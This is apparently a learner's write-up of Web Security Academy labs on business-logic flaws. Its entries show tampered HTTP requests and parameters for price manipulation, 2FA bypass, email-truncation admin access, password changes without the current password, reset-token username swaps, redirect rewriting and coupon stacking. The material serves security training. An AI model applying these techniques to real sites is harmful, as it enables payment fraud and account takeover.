# Title: Business Logic vulnerability's , *Web Academy*
- 👨‍💻By: Nathan Hailu
- 🗒Description: Labs are solved and their write up is here.
- 📅Date:  Fri 12/16/2022

================= { START } ==============================
A) Excessive trust in client-side controls

    When you order a products sites might include the amount of money inside the header as the following.
        POST /cart HTTP/1.1
        Host: 0a7600820378f9bac391207200d40016.web-security-academy.net
        Cookie: session=Ob6eiiqmMCuwttVCCRjagQEsg1US9tzR
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
        Connection: close

        productId=1&redir=PRODUCT&quantity=1&price=133700

        > Here we test the site by changing the price value to other and test if it works

B) 2FA broken logic

    Still looking into the header you can see that the site is validating the user by a cookie name called verify so changing the value there and trying to bruteforce the pin you can bypass it
        POST /login2 HTTP/1.1
        Host: 0aff00e303b87fdcc03c27c100a000fb.web-security-academy.net
        Cookie: session=liecaxPnaznrk54MItecLSRlMcNsz1g0; verify=carlos
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
        Connection: close

        mfa-code=1829

C) High-level logic vulnerability

    The website do client side validations, it check the price of a cart with client side javascript this can be manipulated by using some negative integers with the quantity of a product so i can buy $1339 price product by adding -15 quantity of $86 product when they are added the total price will be minimum and might be equal with the money we have in our stock.

D) Inconsistent handling of exceptional input

    This site displays 256 characters on the email field so, if i added 256 character with an admin email and extra {dot normal email} on the registration, then i can have the admin email displayed and the normal will be cut out. This helps to accept verification emails with my normal email, and have admin access with the admin email.
    solution: 
    email:"hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1@dontwannacry.com.exploit-0a2100e904a468d2c061673a01a40020.exploit-server.net"  

    Displayed: "hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1hacker1@dontwannacry.com"
    So i can have admin account.

E) Inconsistent security controls

    This lab, doesnt have any flaw on the registration and login part. but you have "Update email" feature. The admins have @Dontwannacry.com domain on the email so, it i registered with normal and changed my email to this domain then i can exploit the site/lab.

F) Weak isolation on dual-use endpoint

    Here The lab have a password changing feature.But it requires for Username, Current Password and New password. Here you can add any username you want, so if i don't know the current password of other users i can remove the current-password= parameter and i can change password of any users.
    1ST: csrf=hgWjhMMaGot3Veae57wqjvZiDZskB1kX&username=administrator&**current-password=peter**&new-password-1=peter&new-password-2=peter
    HACKER: csrf=hgWjhMMaGot3Veae57wqjvZiDZskB1kX&username=administrator&new-password-1=peter&new-password-2=peter

G) Password reset broken logic

    When we ask the site for forgotted password reset, the site sends some link that have a random and unique token that possesses to our account. we cant break this but if we intercept the request and send the new password after we accessed the password reseting page, we might have access to change other users pass to because of the broken logic. like below

	temp-forgot-password-token=FHxuvaqUKBZ31QE5PYpJabawSdcc57vM&username=carlos&new-password-1=test&new-password-2=test
		-> here we can change the user name and we got his password!

H) 2FA simple bypass

    - Some Sites will ask for OTP code in different page rather than the login, here the site know that u r logged it, so if you have the path for my profile or other pages on the site by just editing the url to that path you can skip the 2FA.
  
I) Insufficient workflow validation

    - SOme Sites do some confirmations and this site, when you ask for placing your order it will confirm on the way it confirm is it checks if you have enough money and if you have it will redirect to **/cart/order-confirmation?order-confirmed=true** if you don't have it will redirect to **/cart?err=INSUFFICIENT_FUNDS** so , we hackers can intercept and chang the failed redirecttion header to the working on so BOOM!!!
      - ERROR:
            HTTP/1.1 303 See Other
            Location: /cart?err=INSUFFICIENT_FUNDS
            Connection: close
            Content-Length: 0
      - Working:
            HTTP/1.1 303 See Other
            Location: /cart?err=INSUFFICIENT_FUNDS  =>  /cart/order-confirmation?order-confirmed=true
            Connection: close
            Content-Length: 0

J) Authentication bypass via flawed state machine

    - This page validates the privilege of a user with a page called role-selector so if we drop/skip this request while signing in BOOM!
    -  In Burp, turn on proxy intercept then log in.
        Forward the POST /login request. The next request is GET /role-selector. Drop this request and then browse to the lab's home page. Observe that your role has defaulted to the administrator role and you have access to the admin panel.

K) Flawed enforcement of business rules

    - There are 2 coupon codes on this system if you added them sequentially it works else if u added just the 1st 2 time+ it is invalid so by reusing them sequentially it will work
      - NEWCUST5	-$5.00		
        SIGNUP30	-$401.10		
        NEWCUST5	-$5.00		
        SIGNUP30	-$401.10		
        NEWCUST5	-$5.00		
        SIGNUP30	-$401.10		
        NEWCUST5	-$5.00		
        SIGNUP30	-$401.10	                =>   LIKE THIS.!!!

The left overs are time Wasting labs!!

    
